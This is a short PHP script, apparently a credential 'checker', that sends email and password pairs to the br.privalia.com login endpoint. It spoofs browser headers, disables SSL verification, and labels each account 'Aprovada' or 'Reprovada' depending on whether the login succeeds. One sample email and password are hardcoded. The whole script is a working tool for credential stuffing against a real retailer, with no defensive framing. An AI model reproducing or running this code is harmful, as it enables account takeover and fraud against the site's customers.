<?php


/*-------------------*/
#  Coded By Hyperguy  # 
#   t.me/SpiritCoder  #
#     2019/01/14      #
/*-------------------*/


ini_set("max_execution_time", 0);
ini_set("memory_limit", "-1");




function catcha($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function DelCookie()
{
	if(file_exists('Cookie.txt'))
	{
		unlink('Cookie.txt');
	}
}

DelCookie();

class Curl
{

	public $email;
	public $senha;
	public $headers;


	public function CallbackCurl()
	{

		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, "https://br.privalia.com/auth/login");

			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);

				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

							curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

								curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/Cookie.txt');

									curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/Cookie.txt');

										curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);

											curl_setopt($ch, CURLOPT_POST, true);

												curl_setopt($ch, CURLOPT_POSTFIELDS, "login_type=md5&member_login_password=".md5($this->senha)."&member_login_email=$this->email");

													$Login = curl_exec($ch);

														curl_close($ch);

															 $conf = catcha($Login, 'textcodes":["','"]');

															 if($conf == 'User was logged in successfully')
															 {
															 	echo "Aprovada-> $this->email|$this->senha";
															 }
															 else{

															 	echo "Reprovada-> $this->email|$this->senha";
															 }

															   }
	
}

$Chamada = new Curl();

$Chamada->email = 'joseesilva@gmail.com';
$Chamada->senha = '12344321a';
$Chamada->headers = array('Origin: https://br.privalia.com',
	'Referer: https://br.privalia.com/public/',
		'X-Requested-With: XMLHttpRequest',
			'X-Prototype-Version: 1.7.3',
				'Accept: application/json',
					'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
						'ADRUM: isAjax:true',
							'Accept-Language: pt-BR',
								'Host: br.privalia.com',
									'Connection: Keep-Alive');
$Chamada->CallbackCurl();									


flush();

















?>